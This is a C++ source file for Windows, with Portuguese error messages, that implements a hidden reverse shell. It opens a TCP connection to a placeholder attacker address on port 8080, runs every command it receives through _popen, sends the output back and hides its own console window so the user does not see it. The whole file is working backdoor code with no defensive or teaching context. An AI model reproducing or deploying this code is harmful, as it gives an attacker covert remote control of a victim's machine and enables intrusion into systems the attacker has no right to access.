#include <winsock2.h>
#include <windows.h>
#include <ws2tcpip.h>
#include <string>
#include <stdexcept>
#include <cstdio>
#include <memory>

#pragma comment(lib, "Ws2_32.lib")

class WinAPIException : public std::runtime_error {
public:
    WinAPIException(const std::string& message, DWORD errorCode = GetLastError())
        : std::runtime_error(message + " (Error: " + std::to_string(errorCode) + ")") {}
};

class Socket {
    SOCKET socket_ = INVALID_SOCKET;
    
public:
    Socket(int af, int type, int protocol) {
        socket_ = ::socket(af, type, protocol);
        if (socket_ == INVALID_SOCKET) {
            throw WinAPIException("Falha ao criar socket");
        }
    }
    
    ~Socket() { 
        if (socket_ != INVALID_SOCKET) closesocket(socket_); 
    }
    
    void connect(const char* ip, int port) {
        sockaddr_in address{};
        address.sin_family = AF_INET;
        address.sin_port = htons(port);
        inet_pton(AF_INET, ip, &address.sin_addr);

        if (::connect(
            socket_,
            reinterpret_cast<SOCKADDR*>(&address),
            sizeof(address)) == SOCKET_ERROR) {
            throw WinAPIException("Falha na conexão");
        }
    }
    
    int receive(char* buffer, int bufferSize) {
        int bytesReceived = recv(socket_, buffer, bufferSize - 1, 0);
        if (bytesReceived == SOCKET_ERROR) {
            throw WinAPIException("Falha na recepção");
        }
        return bytesReceived;
    }
    
    void send(const std::string& data) {
        if (::send(socket_, data.c_str(), static_cast<int>(data.size()), 0) == SOCKET_ERROR) {
            throw WinAPIException("Falha no envio");
        }
    }
};

class ReverseShell {
    static constexpr int BUFFER_SIZE = 1024;
    static constexpr int PORT = 8080;
    static constexpr const char* SERVER_IP = "192.168.0.X";
    
    Socket socket_;
    
    std::string executeCommand(const std::string& command) {
        std::unique_ptr<FILE, decltype(&_pclose)> pipe(_popen(command.c_str(), "r"), _pclose);
        if (!pipe) throw WinAPIException("Falha ao executar comando");

        std::string result;
        char buffer[1024];
        while (fgets(buffer, sizeof(buffer), pipe.get())) {
            result += buffer;
        }
        return result;
    }

public:
    ReverseShell() : socket_(AF_INET, SOCK_STREAM, IPPROTO_TCP) {
        WSADATA wsaData;
        if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
            throw WinAPIException("Falha no Winsock");
        }
        
        socket_.connect(SERVER_IP, PORT);
    }
    
    ~ReverseShell() {
        WSACleanup();
    }
    
    void run() {
        char commandBuffer[BUFFER_SIZE];
        
        while (true) {
            try {
                int bytesReceived = socket_.receive(commandBuffer, BUFFER_SIZE);
                if (bytesReceived <= 0) break;
                
                commandBuffer[bytesReceived] = '\0';
                std::string command = commandBuffer;
                
                std::string output;
                try {
                    output = executeCommand(command);
                } 
                catch (const std::exception& e) {
                    output = "[ERRO] " + std::string(e.what()) + "\n";
                }
                
                socket_.send(output);
            } 
            catch (const WinAPIException&) {
                break;
            }
        }
    }
};

int main() {
    if (HWND console = GetConsoleWindow()) {
        ShowWindow(console, SW_HIDE);
    }
    
    try {
        ReverseShell shell;
        shell.run();
        return 0;
    } 
    catch (...) { 
        return 1; 
    }
}
